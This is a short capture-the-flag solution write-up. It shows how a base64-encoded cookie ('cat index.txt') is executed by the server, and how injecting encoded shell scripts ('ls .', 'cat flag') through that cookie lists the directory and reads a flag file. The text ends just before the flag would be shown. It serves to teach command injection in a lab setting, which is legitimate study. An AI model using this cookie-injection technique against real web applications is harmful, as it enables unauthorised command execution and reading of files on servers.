Solution
Analyzing the cookies you can find the following:

tallahassee : Y2F0IGluZGV4LnR4dA%3D%3D

This cookie is base64 encoded:

Y2F0IGluZGV4LnR4dA==

Decoding it:

cat index.txt

Trying a command injection via the cookie will generate Base64 cookies in the following format:

cat index.txt #ls

So, trying to inject the Base64 version of this snippet:

!/bin/bash
ls .

Will enumerate the folder content, showing the presence of a "flag" file.
Trying to print the "flag" file with the following script (encoded via Base64 and passed into the cookie):

!/bin/bash
cat flag

Will show the flag:
